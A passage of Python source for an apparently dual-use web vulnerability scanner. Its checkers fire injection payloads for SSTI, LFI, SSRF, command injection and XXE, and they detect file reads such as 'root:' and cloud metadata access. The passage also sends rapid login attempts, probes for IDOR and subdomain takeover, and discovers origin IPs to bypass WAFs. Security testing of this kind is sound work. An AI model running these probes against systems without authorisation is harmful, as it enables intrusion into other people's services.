                        with lock:
                            findings.append({
                                'type':      'SSTI',
                                'severity':  'CRITICAL',
                                'url':       test_url,
                                'param':     param,
                                'payload':   payload,
                                'engine':    engine,
                                'evidence':  f"Math expression {payload!r} evaluated to {expected!r} in response",
                                'description': f"SSTI ({engine}) in param '{param}' — template injection likely leads to RCE",
                                'remediation': 'Never pass user input directly to template rendering functions',
                            })
            except Exception:
                pass

        pairs = [(p, pl, ex, eng) for p in params_to_test for pl, ex, eng in SSTI_PAYLOADS[:6]]
        with cf.ThreadPoolExecutor(max_workers=6) as pool:
            futs = {pool.submit(probe, p, pl, ex, eng): (p,) for p, pl, ex, eng in pairs}
            cf.wait(futs, timeout=45)
            for f in futs: f.cancel()

        return findings


# =============================================================================
# 4. LFI / PATH TRAVERSAL CHECKER
# =============================================================================

class LFIChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = _make_fast_session(session, timeout)
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str, params: list = None) -> list:
        findings = []
        parsed   = urlparse(url)
        qs       = parse_qs(parsed.query)
        params_to_test = list(set(list(qs.keys()) + (params or []) + LFI_PARAMS))[:25]

        lock = threading.Lock()

        def probe(param, payload, expected):
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_qs = dict(qs)
            test_qs[param] = [payload]
            test_url = base + '?' + urlencode(test_qs, doseq=True)
            try:
                r    = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                body = r.text
                if expected in body and (
                    'root:' in body or '[fonts]' in body or
                    'cm9vd' in body or 'PATH=' in body or 'localhost' in body
                ):
                    with lock:
                        findings.append({
                            'type':      'LFI_PATH_TRAVERSAL',
                            'severity':  'CRITICAL',
                            'url':       test_url,
                            'param':     param,
                            'payload':   payload,
                            'evidence':  f"File content found: ...{body[body.find(expected):body.find(expected)+100]}...",
                            'description': f"Local File Inclusion in param '{param}' — arbitrary file read",
                            'remediation': 'Validate and sanitize file path inputs; use allowlists; chroot',
                        })
            except Exception:
                pass

        pairs = [(p, pl, ex) for p in params_to_test for pl, ex in LFI_PAYLOADS[:6]]
        with cf.ThreadPoolExecutor(max_workers=8) as pool:
            futs = {pool.submit(probe, p, pl, ex): (p,) for p, pl, ex in pairs}
            cf.wait(futs, timeout=60)
            for f in futs: f.cancel()

        return findings


# =============================================================================
# 5. SSRF CHECKER
# =============================================================================

class SSRFChecker:
    def __init__(self, session: requests.Session, timeout: int = 6, log_fn=None):
        self.session = _make_fast_session(session, timeout)
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str, params: list = None) -> list:
        findings = []
        parsed   = urlparse(url)
        qs       = parse_qs(parsed.query)
        params_to_test = list(set(list(qs.keys()) + (params or []) + SSRF_PARAMS))[:20]

        lock = threading.Lock()

        def probe(param, payload):
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_qs = dict(qs)
            test_qs[param] = [payload]
            test_url = base + '?' + urlencode(test_qs, doseq=True)
            try:
                r    = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                body = r.text[:3000]
                for pat in SSRF_SUCCESS_PATTERNS:
                    m = pat.search(body)
                    if m:
                        with lock:
                            findings.append({
                                'type':      'SSRF',
                                'severity':  'CRITICAL',
                                'url':       test_url,
                                'param':     param,
                                'payload':   payload,
                                'evidence':  f"SSRF response match: {m.group(0)[:80]}",
                                'description': f"SSRF in param '{param}' — server fetches attacker-controlled URLs",
                                'remediation': 'Validate/allowlist URLs server-side; block internal ranges',
                            })
                        break
                # Error-based: some servers return error mentioning the URL they tried to fetch
                if payload in body or '169.254.169.254' in body:
                    with lock:
                        findings.append({
                            'type':      'SSRF_POTENTIAL',
                            'severity':  'HIGH',
                            'url':       test_url,
                            'param':     param,
                            'payload':   payload,
                            'evidence':  f"Payload reflected/mentioned in response — possible SSRF",
                            'description': f"Potential SSRF in param '{param}'",
                            'remediation': 'Validate/allowlist URLs server-side; block internal ranges',
                        })
            except Exception:
                pass

        pairs = [(p, pl) for p in params_to_test for pl in SSRF_PAYLOADS[:6]]
        with cf.ThreadPoolExecutor(max_workers=6) as pool:
            futs = {pool.submit(probe, p, pl): (p, pl) for p, pl in pairs}
            cf.wait(futs, timeout=45)
            for f in futs: f.cancel()

        return findings


# =============================================================================
# 6. COMMAND INJECTION CHECKER
# =============================================================================

class CMDIChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = _make_fast_session(session, timeout)
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str, params: list = None) -> list:
        findings = []
        parsed   = urlparse(url)
        qs       = parse_qs(parsed.query)
        params_to_test = list(set(list(qs.keys()) + (params or []) + CMDI_PARAMS))[:20]

        lock = threading.Lock()

        def probe(param, payload, expected):
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            test_qs = dict(qs)
            test_qs[param] = [payload]
            test_url = base + '?' + urlencode(test_qs, doseq=True)
            try:
                t0   = time.time()
                r    = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                elapsed = time.time() - t0
                body = r.text[:4000]

                if expected and expected in body:
                    with lock:
                        findings.append({
                            'type':      'COMMAND_INJECTION',
                            'severity':  'CRITICAL',
                            'url':       test_url,
                            'param':     param,
                            'payload':   payload,
                            'evidence':  f"OS command output in response: {body[body.find(expected):body.find(expected)+100]}",
                            'description': f"Command injection in param '{param}'",
                            'remediation': 'Never pass user input to shell commands; use safe APIs',
                        })
                elif expected is None and elapsed >= 1.8:
                    with lock:
                        findings.append({
                            'type':      'COMMAND_INJECTION_BLIND',
                            'severity':  'HIGH',
                            'url':       test_url,
                            'param':     param,
                            'payload':   payload,
                            'evidence':  f"Time delay {elapsed:.1f}s after sleep/ping payload",
                            'description': f"Blind command injection in param '{param}'",
                            'remediation': 'Never pass user input to shell commands; use safe APIs',
                        })
            except Exception:
                pass

        pairs = [(p, pl, ex) for p in params_to_test for pl, ex in CMDI_PAYLOADS[:6]]
        with cf.ThreadPoolExecutor(max_workers=6) as pool:
            futs = {pool.submit(probe, p, pl, ex): (p,) for p, pl, ex in pairs}
            cf.wait(futs, timeout=60)
            for f in futs: f.cancel()

        return findings


# =============================================================================
# 7. XXE CHECKER
# =============================================================================

class XXEChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = _make_fast_session(session, timeout)
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str) -> list:
        """
        Probe URL with XML content-type POST requests containing XXE payloads.
        Also probe endpoints that accept XML (SOAP, REST with XML).
        """
        findings = []
        for payload, expected in XXE_PAYLOADS[:3]:
            for ct in ['application/xml', 'text/xml']:
                try:
                    r = self.session.post(
                        url,
                        data=payload,
                        headers={'Content-Type': ct},
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                    if expected and expected in r.text:
                        findings.append({
                            'type':      'XXE_INJECTION',
                            'severity':  'CRITICAL',
                            'url':       url,
                            'payload':   payload[:80] + '...',
                            'evidence':  f"File content in response: {r.text[:200]}",
                            'description': 'XML External Entity (XXE) injection — file read / SSRF possible',
                            'remediation': 'Disable external entity processing in XML parser; use JSON',
                        })
                        break
                except Exception:
                    pass
        return findings


# =============================================================================
# 8. SECURITY HEADER ANALYZER
# =============================================================================

class SecurityHeaderAnalyzer:
    def __init__(self, session: requests.Session, timeout: int = 10, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def analyze(self, url: str) -> list:
        findings = []
        try:
            r    = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            hdrs = {k.lower(): v for k, v in r.headers.items()}

            for header, info in SECURITY_HEADERS.items():
                hdr_lower = header.lower()
                if hdr_lower not in hdrs:
                    findings.append({
                        'type':        'MISSING_SECURITY_HEADER',
                        'severity':    info['missing_severity'],
                        'url':         url,
                        'header':      header,
                        'description': info['description'],
                        'remediation': info['remediation'],
                        'evidence':    f'Header "{header}" not present in response',
                    })
                else:
                    val = hdrs[hdr_lower]
                    # CSP quality checks
                    if hdr_lower == 'content-security-policy':
                        for pat, sev, desc in CSP_WEAK_PATTERNS:
                            if pat.search(val):
                                findings.append({
                                    'type':        'WEAK_CSP',
                                    'severity':    sev,
                                    'url':         url,
                                    'header':      header,
                                    'value':       val[:200],
                                    'description': desc,
                                    'remediation': "Tighten your CSP; remove unsafe-inline/unsafe-eval",
                                    'evidence':    f"CSP value: {val[:150]}",
                                })
                    # HSTS checks
                    if hdr_lower == 'strict-transport-security':
                        m = re.search(r'max-age=(\d+)', val)
                        if m and int(m.group(1)) < 86400:
                            findings.append({
                                'type':        'WEAK_HSTS',
                                'severity':    'MEDIUM',
                                'url':         url,
                                'header':      header,
                                'value':       val,
                                'description': 'HSTS max-age too short (< 1 day)',
                                'remediation': 'Set max-age to at least 31536000 (1 year)',
                                'evidence':    f"max-age={m.group(1)}",
                            })

            # Check for version banners
            hdrs_raw = '\r\n'.join(f"{k}: {v}" for k, v in r.headers.items())
            for pat in SERVER_VERSION_PATTERNS:
                m = pat.search(hdrs_raw)
                if m:
                    findings.append({
                        'type':        'SERVER_VERSION_DISCLOSURE',
                        'severity':    'LOW',
                        'url':         url,
                        'header':      'Server/X-Powered-By',
                        'value':       m.group(0),
                        'description': f"Server version disclosed: {m.group(0)[:60]}",
                        'remediation': 'Remove version information from Server/X-Powered-By headers',
                        'evidence':    m.group(0)[:80],
                    })

        except Exception as e:
            self.log(f"  [header check] error: {e}")

        return findings


# =============================================================================
# 9. COOKIE SECURITY AUDITOR
# =============================================================================

class CookieAuditor:
    def __init__(self, session: requests.Session, timeout: int = 10, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def audit(self, url: str) -> list:
        findings = []
        try:
            r = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            set_cookie_headers = r.raw.headers.getlist('Set-Cookie') if hasattr(r.raw.headers, 'getlist') else []

            # Also check via requests cookie jar
            for cookie in r.cookies:
                name  = cookie.name
                flags = str(cookie.__dict__)
                value = cookie.value or ''

                if not cookie.secure:
                    findings.append({
                        'type':      'COOKIE_MISSING_SECURE',
                        'severity':  'MEDIUM',
                        'url':       url,
                        'cookie':    name,
                        'description': f"Cookie '{name}' missing Secure flag — sent over HTTP",
                        'remediation': 'Add Secure flag to all sensitive cookies',
                        'evidence':  f"Cookie: {name}={value[:20]}... (no Secure flag)",
                    })

                if not cookie.has_nonstandard_attr('HttpOnly'):
                    # Check via raw header too
                    raw_ok = any(
                        f'httponly' in h.lower() and name.lower() in h.lower()
                        for h in set_cookie_headers
                    )
                    if not raw_ok:
                        findings.append({
                            'type':      'COOKIE_MISSING_HTTPONLY',
                            'severity':  'MEDIUM',
                            'url':       url,
                            'cookie':    name,
                            'description': f"Cookie '{name}' missing HttpOnly — accessible via JavaScript (XSS risk)",
                            'remediation': 'Add HttpOnly flag to session cookies',
                            'evidence':  f"Cookie: {name} (no HttpOnly)",
                        })

                # Check SameSite via raw header
                same_site_present = any(
                    'samesite' in h.lower() and name.lower() in h.lower()
                    for h in set_cookie_headers
                )
                if not same_site_present:
                    findings.append({
                        'type':      'COOKIE_MISSING_SAMESITE',
                        'severity':  'LOW',
                        'url':       url,
                        'cookie':    name,
                        'description': f"Cookie '{name}' missing SameSite attribute — CSRF risk",
                        'remediation': "Add SameSite=Strict or SameSite=Lax",
                        'evidence':  f"Cookie: {name} (no SameSite)",
                    })

                # Check entropy — short/predictable session tokens
                if len(value) < 16 and any(kw in name.lower() for kw in
                                            ['sess', 'token', 'auth', 'id', 'uid', 'user']):
                    findings.append({
                        'type':      'COOKIE_LOW_ENTROPY',
                        'severity':  'HIGH',
                        'url':       url,
                        'cookie':    name,
                        'description': f"Session cookie '{name}' has low entropy (value length={len(value)})",
                        'remediation': 'Use cryptographically random session tokens (≥128 bits)',
                        'evidence':  f"Cookie {name}={value[:30]} (short)",
                    })

        except Exception:
            pass

        return findings


# =============================================================================
# 10. JWT ANALYZER
# =============================================================================

class JWTAnalyzer:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def _decode_b64(self, s: str) -> bytes:
        s += '=' * (-len(s) % 4)
        try:
            import base64
            return base64.urlsafe_b64decode(s)
        except Exception:
            return b''

    def analyze_token(self, token: str, url: str) -> list:
        """Analyze a JWT for security issues."""
        findings = []
        parts = token.split('.')
        if len(parts) != 3:
            return findings

        try:
            import base64, json as _json
            header  = _json.loads(self._decode_b64(parts[0]))
            payload = _json.loads(self._decode_b64(parts[1]))
        except Exception:
            return findings

        alg = header.get('alg', '').upper()

        # 1. None algorithm
        if alg in ('NONE', ''):
            findings.append({
                'type':      'JWT_ALG_NONE',
                'severity':  'CRITICAL',
                'url':       url,
                'token_prefix': token[:30] + '...',
                'description': 'JWT uses "none" algorithm — signature verification bypassed',
                'remediation': 'Enforce algorithm allowlist on the server; reject none/empty alg',
                'evidence':  f"alg: {alg}",
            })

        # 2. Expired but accepted
        exp = payload.get('exp')
        if exp and exp < time.time():
            findings.append({
                'type':      'JWT_EXPIRED_ACCEPTED',
                'severity':  'HIGH',
                'url':       url,
                'token_prefix': token[:30] + '...',
                'description': 'Server accepted an expired JWT token',
                'remediation': 'Validate exp claim server-side on every request',
                'evidence':  f"exp={exp} (expired {int(time.time()-exp)}s ago)",
            })

        # 3. Sensitive data in payload
        sensitive_keys = ['password', 'passwd', 'pwd', 'secret', 'private',
                          'ssn', 'credit_card', 'cc_num']
        for key in sensitive_keys:
            if key in str(payload).lower():
                findings.append({
                    'type':      'JWT_SENSITIVE_DATA',
                    'severity':  'HIGH',
                    'url':       url,
                    'token_prefix': token[:30] + '...',
                    'description': f"JWT payload contains sensitive key: {key}",
                    'remediation': 'Never store sensitive data in JWT payload; use opaque tokens',
                    'evidence':  f"Payload key: {key}",
                })

        return findings

    def find_and_analyze(self, url: str) -> list:
        """Scan response headers/body/cookies for JWTs and analyze them."""
        findings = []
        try:
            r    = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            text = r.text + '\r\n'.join(f"{k}: {v}" for k, v in r.headers.items())

            jwt_pat = re.compile(r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{5,}')
            for m in jwt_pat.finditer(text):
                token = m.group(0)
                results = self.analyze_token(token, url)
                findings.extend(results)

            # Also check cookies
            for cookie in r.cookies:
                val = cookie.value or ''
                if val.startswith('eyJ'):
                    results = self.analyze_token(val, url)
                    findings.extend(results)

        except Exception:
            pass
        return findings


# =============================================================================
# 11. RATE LIMITING CHECKER
# =============================================================================

class RateLimitChecker:
    def __init__(self, session: requests.Session, timeout: int = 5, log_fn=None):
        self.session = _make_fast_session(session, timeout)
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str) -> list:
        """Send 10 rapid requests and check if rate limiting kicks in."""
        findings = []
        status_codes = []

        for i in range(10):
            try:
                r = self.session.post(
                    url,
                    data={'username': f'testuser{i}@jsscout.test', 'password': 'wrongpassword123'},
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                status_codes.append(r.status_code)
                # 429 = rate limited, good
                if r.status_code == 429:
                    return findings  # rate limiting is working
            except Exception:
                break
            time.sleep(0.1)

        if len(status_codes) >= 8 and 429 not in status_codes:
            # Check if any response got blocked
            if all(sc in (200, 302, 401, 403) for sc in status_codes):
                findings.append({
                    'type':      'MISSING_RATE_LIMITING',
                    'severity':  'MEDIUM',
                    'url':       url,
                    'description': f"No rate limiting detected — sent 10 auth requests with no 429 response",
                    'evidence':  f"10 requests → status codes: {status_codes}",
                    'remediation': 'Implement rate limiting on authentication endpoints (e.g. 5 attempts/min)',
                })

        return findings


# =============================================================================
# 12. SUBDOMAIN TAKEOVER
# =============================================================================

class SubdomainTakeoverChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def check_subdomains(self, subdomains: list, domain: str) -> list:
        findings = []
        lock = threading.Lock()

        def probe(subdomain):
            try:
                url = f"https://{subdomain}"
                r   = self.session.get(url, timeout=self.timeout, allow_redirects=True,
                                       verify=False)
                body = r.text[:3000]

                for service, fingerprint in TAKEOVER_SIGNATURES.items():
                    if fingerprint.lower() in body.lower():
                        with lock:
                            findings.append({
                                'type':      'SUBDOMAIN_TAKEOVER',
                                'severity':  'HIGH',
                                'url':       url,
                                'subdomain': subdomain,
                                'service':   service,
                                'evidence':  f"Takeover fingerprint found: {fingerprint[:60]}",
                                'description': f"Subdomain {subdomain} potentially takeable — CNAME points to unclaimed {service}",
                                'remediation': f"Remove dangling CNAME record or claim the {service} resource",
                            })

            except requests.exceptions.ConnectionError:
                # NXDOMAIN / unreachable — check if CNAME exists
                if DNS_OK:
                    try:
                        ans = dns.resolver.resolve(subdomain, 'CNAME')
                        for r in ans:
                            cname_target = str(r.target).rstrip('.')
                            for service in TAKEOVER_SIGNATURES:
                                if service in cname_target:
                                    with lock:
                                        findings.append({
                                            'type':      'SUBDOMAIN_TAKEOVER_DANGLING_CNAME',
                                            'severity':  'CRITICAL',
                                            'url':       f"https://{subdomain}",
                                            'subdomain': subdomain,
                                            'cname':     cname_target,
                                            'service':   service,
                                            'evidence':  f"CNAME {subdomain} → {cname_target} (service not found)",
                                            'description': f"Dangling CNAME — {subdomain} → {cname_target} is unclaimed",
                                            'remediation': f"Remove or reclaim CNAME record",
                                        })
                    except Exception:
                        pass
            except Exception:
                pass

        with cf.ThreadPoolExecutor(max_workers=15) as pool:
            futs = {pool.submit(probe, s): s for s in subdomains[:50]}
            cf.wait(futs, timeout=90)
            for f in futs: f.cancel()

        return findings


# =============================================================================
# 13. HTTP METHOD CHECKER
# =============================================================================

class HTTPMethodChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str) -> list:
        findings = []

        for method in DANGEROUS_METHODS:
            try:
                r = self.session.request(method, url, timeout=self.timeout,
                                         allow_redirects=False)
                if r.status_code not in (405, 501, 400):
                    findings.append({
                        'type':      f'HTTP_METHOD_{method}_ALLOWED',
                        'severity':  'MEDIUM' if method in ('TRACE', 'PATCH') else 'HIGH',
                        'url':       url,
                        'method':    method,
                        'status':    r.status_code,
                        'description': f"HTTP {method} method allowed — status {r.status_code}",
                        'evidence':  f"{method} {url} → {r.status_code}",
                        'remediation': f"Disable {method} method on the server unless explicitly required",
                    })
                    # Special TRACE check: XST attack
                    if method == 'TRACE' and 'TRACE' in r.text:
                        findings[-1]['severity'] = 'HIGH'
                        findings[-1]['description'] += ' (XST vulnerability — request reflected back)'
            except Exception:
                pass

        # Method override header check
        for override_header in ['X-HTTP-Method-Override', 'X-Method-Override', 'X-HTTP-Method']:
            for method in ['DELETE', 'PUT']:
                try:
                    r = self.session.post(
                        url,
                        headers={override_header: method},
                        timeout=self.timeout,
                        allow_redirects=False,
                    )
                    if r.status_code not in (405, 501, 404, 400):
                        findings.append({
                            'type':      'HTTP_METHOD_OVERRIDE',
                            'severity':  'MEDIUM',
                            'url':       url,
                            'header':    override_header,
                            'method':    method,
                            'status':    r.status_code,
                            'description': f"Method override via {override_header}: {method} accepted",
                            'evidence':  f"POST + {override_header}: {method} → {r.status_code}",
                            'remediation': f"Disable method override headers unless intentionally used",
                        })
                except Exception:
                    pass

        return findings


# =============================================================================
# 14. INFORMATION DISCLOSURE CHECKER
# =============================================================================

class InfoDisclosureChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str) -> list:
        findings = []

        # Probe error pages
        error_urls = [
            url + '/jsscout_nonexistent_path_404',
            url + '/jsscout_error_trigger?id=99999999999999',
            url + '/jsscout_error_trigger?id=abc',
        ]

        for test_url in error_urls:
            try:
                r    = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                full = '\r\n'.join(f"{k}: {v}" for k, v in r.headers.items()) + '\r\n' + r.text[:5000]

                for pat, sev, desc in INFO_DISCLOSURE_PATTERNS:
                    m = pat.search(full)
                    if m:
                        findings.append({
                            'type':      'INFO_DISCLOSURE',
                            'severity':  sev,
                            'url':       test_url,
                            'pattern':   desc,
                            'evidence':  f"{desc}: {m.group(0)[:100]}",
                            'description': desc,
                            'remediation': 'Suppress verbose error messages in production; use generic error pages',
                        })
            except Exception:
                pass

        return findings

    def check_response(self, url: str, body: str, headers: dict) -> list:
        """Check an already-fetched response for info disclosure."""
        findings = []
        full = '\r\n'.join(f"{k}: {v}" for k, v in headers.items()) + '\r\n' + body[:5000]
        seen = set()
        for pat, sev, desc in INFO_DISCLOSURE_PATTERNS:
            m = pat.search(full)
            if m and desc not in seen:
                seen.add(desc)
                findings.append({
                    'type':      'INFO_DISCLOSURE',
                    'severity':  sev,
                    'url':       url,
                    'pattern':   desc,
                    'evidence':  f"{desc}: {m.group(0)[:100]}",
                    'description': desc,
                    'remediation': 'Suppress verbose error messages; remove version headers',
                })
        return findings


# =============================================================================
# 15. CLICKJACKING CHECKER (standalone)
# =============================================================================

class ClickjackingChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str) -> list:
        findings = []
        try:
            r    = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            hdrs = {k.lower(): v.lower() for k, v in r.headers.items()}

            xfo = hdrs.get('x-frame-options', '')
            csp = hdrs.get('content-security-policy', '')

            frame_ancestors_ok = 'frame-ancestors' in csp and (
                "'none'" in csp or "'self'" in csp
            )

            if not xfo and not frame_ancestors_ok:
                findings.append({
                    'type':      'CLICKJACKING',
                    'severity':  'MEDIUM',
                    'url':       url,
                    'description': 'Page can be framed — clickjacking attack possible',
                    'evidence':  'No X-Frame-Options header and no CSP frame-ancestors directive',
                    'remediation': "Add X-Frame-Options: DENY or CSP: frame-ancestors 'none'",
                })
            elif xfo and xfo not in ('deny', 'sameorigin'):
                findings.append({
                    'type':      'CLICKJACKING_WEAK',
                    'severity':  'LOW',
                    'url':       url,
                    'description': f"Weak X-Frame-Options: {xfo}",
                    'evidence':  f"X-Frame-Options: {xfo}",
                    'remediation': "Use X-Frame-Options: DENY",
                })

        except Exception:
            pass
        return findings


# =============================================================================
# 16. IDOR / PARAMETER TAMPERING
# =============================================================================

class IDORChecker:
    def __init__(self, session: requests.Session, timeout: int = 8, log_fn=None):
        self.session = session
        self.timeout = timeout
        self.log     = log_fn or print

    def check(self, url: str, params: list = None) -> list:
        findings = []
        parsed   = urlparse(url)
        qs       = parse_qs(parsed.query)

        # Find numeric params
        numeric_params = {
            k: v[0] for k, v in qs.items()
            if v and re.match(r'^\d+$', v[0])
        }

        if not numeric_params:
            return findings

        for param, value in list(numeric_params.items())[:5]:
            try:
                orig_val = int(value)
                # Try adjacent IDs
                test_ids = [orig_val - 1, orig_val + 1, orig_val + 100,
                            1, 2, 100, 9999]

                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                r0   = self.session.get(url, timeout=self.timeout)
                orig_hash = hashlib.md5(r0.text[:1000].encode()).hexdigest()

                for test_id in test_ids:
                    if test_id <= 0:
                        continue
                    test_qs = dict(qs)
                    test_qs[param] = [str(test_id)]
                    test_url = base + '?' + urlencode(test_qs, doseq=True)
                    try:
                        r = self.session.get(test_url, timeout=self.timeout,
                                             allow_redirects=False)
                        if r.status_code == 200:
                            new_hash = hashlib.md5(r.text[:1000].encode()).hexdigest()
                            if new_hash != orig_hash and len(r.text) > 100:
                                findings.append({
                                    'type':      'IDOR_POTENTIAL',
                                    'severity':  'HIGH',
                                    'url':       test_url,
                                    'param':     param,
                                    'orig_id':   str(orig_val),
                                    'test_id':   str(test_id),
                                    'description': f"Potential IDOR — changing {param}={orig_val} to {test_id} returns different content",
                                    'evidence':  f"GET {test_url} → 200 with different response body",
                                    'remediation': 'Implement proper authorization checks on all object references',
                                })
                                break  # one finding per param is enough
                    except Exception:
                        pass

            except Exception:
                pass

        return findings


# =============================================================================
# MAIN ORCHESTRATOR
# =============================================================================

class AdvancedScanner:
    """
    Orchestrates all advanced vulnerability checks.
    Designed to be called from jsscout.py Phase 11.
    """

    def __init__(self, target_url: str, session: requests.Session = None,
                 threads: int = 10, timeout: int = 10, log_fn=None):
        if '://' not in target_url:
            target_url = 'https://' + target_url
        self.target_url  = target_url
        self.base_url    = target_url.rstrip('/')
        self.threads     = threads
        self.timeout     = timeout
        self.log         = log_fn or print

        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault('User-Agent',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36')

        self.findings = defaultdict(list)

    def _log_finding(self, category: str, f: dict):
        """Log a finding immediately as it's discovered."""
        sev     = f.get('severity', 'INFO')
        ftype   = f.get('type', category)
        desc    = f.get('description', '')[:80]
        url     = f.get('url', '')[:80]
        self.log(f"  [{ftype}] [{sev}] {desc}")
        self.log(f"           URL: {url}")
        ev = f.get('evidence', '')
        if ev:
            self.log(f"           Evidence: {ev[:120]}")

    def run_all(self, urls: list = None, param_map: dict = None,
                subdomains: list = None) -> dict:
        """
        Run all advanced checks. Returns dict of findings by category.
        urls      : list of same-domain URLs to check (from crawler)
        param_map : {url: [param_names]} from crawler
        subdomains: list of discovered subdomains (from crt.sh etc)
        """
        all_urls = list(set([self.base_url] + (urls or [])))
        param_map = param_map or {}
        subdomains = subdomains or []
        t0 = time.time()

        # ── 1. WAF Detection & Origin IP ─────────────────────────────────────
        self.log("\n[*] Phase A: WAF detection & Origin IP discovery...")
        waf_detector = WAFOriginDetector(self.session, self.timeout, self.log)
        waf_result   = waf_detector.run(self.base_url)
        self.findings['waf'] = [waf_result]

        waf_name = waf_result['waf_info'].get('waf')
        if waf_name:
            self.log(f"  [WAF] Detected: {waf_name}")
            for ev in waf_result['waf_info'].get('evidence', [])[:3]:
                self.log(f"        {ev}")
        else:
            self.log("  [WAF] No WAF/CDN detected")

        origin = waf_result['origin_info']
        if origin.get('origin_ip'):
            self.log(f"  [ORIGIN] Real IP found: {origin['origin_ip']} via {origin['method']}")
            self.log(f"  [ORIGIN] Bypass URL: {origin['bypass_url']}")
        if origin.get('subdomains'):
            self.log(f"  [ORIGIN] {len(origin['subdomains'])} subdomains from crt.sh")
        if origin.get('candidate_ips'):
            self.log(f"  [ORIGIN] Candidate IPs: {', '.join(origin['candidate_ips'][:5])}")

        # Merge subdomains from crt.sh into subdomain list
        subdomains = list(set(subdomains + origin.get('subdomains', [])))

        # ── 2. Security Headers ───────────────────────────────────────────────
        self.log("\n[*] Phase B: Security header analysis...")
        header_analyzer = SecurityHeaderAnalyzer(self.session, self.timeout, self.log)
        hdr_findings    = header_analyzer.analyze(self.base_url)
        self.findings['security_headers'] = hdr_findings
        if hdr_findings:
            for f in hdr_findings:
                self._log_finding('security_headers', f)
        self.log(f"  [+] Headers: {len(hdr_findings)} issues found")

        # ── 3. Cookie Audit ───────────────────────────────────────────────────
        self.log("\n[*] Phase C: Cookie security audit...")
        cookie_auditor = CookieAuditor(self.session, self.timeout, self.log)
        ck_findings    = cookie_auditor.audit(self.base_url)
        self.findings['cookies'] = ck_findings
        for f in ck_findings:
            self._log_finding('cookies', f)
        self.log(f"  [+] Cookies: {len(ck_findings)} issues found")

        # ── 4. Clickjacking ───────────────────────────────────────────────────
        self.log("\n[*] Phase D: Clickjacking check...")
        cj_checker  = ClickjackingChecker(self.session, self.timeout, self.log)
        cj_findings = cj_checker.check(self.base_url)
        self.findings['clickjacking'] = cj_findings
        for f in cj_findings:
            self._log_finding('clickjacking', f)

        # ── 5. HTTP Methods ───────────────────────────────────────────────────
        self.log("\n[*] Phase E: HTTP method tampering check...")
        method_checker  = HTTPMethodChecker(self.session, self.timeout, self.log)
        method_findings = method_checker.check(self.base_url)
        self.findings['http_methods'] = method_findings
        for f in method_findings:
            self._log_finding('http_methods', f)
        self.log(f"  [+] Methods: {len(method_findings)} issues found")

        # ── 6. Information Disclosure ─────────────────────────────────────────
        self.log("\n[*] Phase F: Information disclosure probing...")
        info_checker  = InfoDisclosureChecker(self.session, self.timeout, self.log)
        info_findings = info_checker.check(self.base_url)
        self.findings['info_disclosure'] = info_findings
        for f in info_findings:
            self._log_finding('info_disclosure', f)
        self.log(f"  [+] Info disclosure: {len(info_findings)} issues found")

        # ── 7. JWT Analysis ───────────────────────────────────────────────────
        self.log("\n[*] Phase G: JWT token analysis...")
        jwt_analyzer  = JWTAnalyzer(self.session, self.timeout, self.log)
        jwt_findings  = []
        for url in all_urls[:10]:
            jwt_findings.extend(jwt_analyzer.find_and_analyze(url))
        self.findings['jwt'] = jwt_findings
        for f in jwt_findings:
            self._log_finding('jwt', f)
        self.log(f"  [+] JWT: {len(jwt_findings)} issues found")

        # ── 8. SQL Injection ──────────────────────────────────────────────────
        self.log(f"\n[*] Phase H: SQL injection testing ({len(all_urls)} URLs)...")
        sqli_checker  = SQLiChecker(self.session, self.timeout, self.log)
        sqli_findings = []

        def check_sqli(url):
            params = list(param_map.get(url, []))
            res    = sqli_checker.check_url(url, params)
            if res:
                with threading.Lock():
                    sqli_findings.extend(res)
                    for f in res:
                        self._log_finding('sqli', f)

        sqli_findings.extend(sqli_checker.check_headers(self.base_url))

        with cf.ThreadPoolExecutor(max_workers=min(self.threads, 8)) as pool:
            futs = {pool.submit(check_sqli, u): u for u in all_urls[:30]}
            cf.wait(futs, timeout=120)
            for f in futs: f.cancel()

        self.findings['sqli'] = sqli_findings
        self.log(f"  [+] SQLi: {len(sqli_findings)} issues found")

        # ── 9. SSTI ───────────────────────────────────────────────────────────
